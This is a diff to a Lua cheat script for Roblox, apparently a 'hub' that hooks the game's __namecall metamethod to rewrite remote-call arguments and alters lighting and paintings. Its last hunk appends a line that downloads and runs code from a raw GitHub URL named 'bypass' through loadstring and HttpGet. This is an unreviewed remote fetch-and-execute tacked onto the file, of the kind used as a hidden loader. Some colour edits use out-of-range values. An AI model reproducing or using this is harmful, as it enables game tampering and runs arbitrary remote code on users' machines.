@@ -1,4 +1,4 @@
-local IMAGE = "rbxassetid://637373817841"
+local IMAGE = "rbxassetid://671181930"
 local Positions = UDim2.new(0.822025776, 0, 0.0401606411, 0)
 local Sizes = UDim2.new(0, 76, 0, 70)
 local YOUHUB = Instance.new("ScreenGui")
@@ -144,7 +144,7 @@ local function ReplacePainting(Painting,NewImage,NewTitle)
     Painting:WaitForChild("Canvas").SurfaceGui.ImageLabel.Image = NewImage
     Painting.Canvas.SurfaceGui.ImageLabel.BackgroundTransparency = 1
     Painting.Canvas.SurfaceGui.ImageLabel.ImageTransparency = 0
-    Painting.Canvas.SurfaceGui.ImageLabel.ImageColor3 = Color3.new(1,1,1)
+    Painting.Canvas.SurfaceGui.ImageLabel.ImageColor3 = Color3.new(7,9,9)
     local NewPrompt = Painting:WaitForChild("InteractPrompt"):Clone()
     Painting.InteractPrompt:Destroy()
     NewPrompt.Parent = Painting
@@ -380,7 +380,7 @@ local function ApplyCharacter(DontYield)
     end)
     Lighting:GetPropertyChangedSignal("Ambient"):Connect(function()
         if NoDark then
-            Lighting.Ambient = Color3.fromRGB(67, 51, 56)
+            Lighting.Ambient = Color3.fromRGB(1, 1, 1)
         end
     end)
     Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(ApplySpeed)
@@ -733,3 +733,4 @@ mt.__namecall = newcclosure(function(remote,...)
     return old_mt(remote,table.unpack(args))
 end)
 setreadonly(mt,true)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/finngameandglitch/bypass/main/bypass'))()
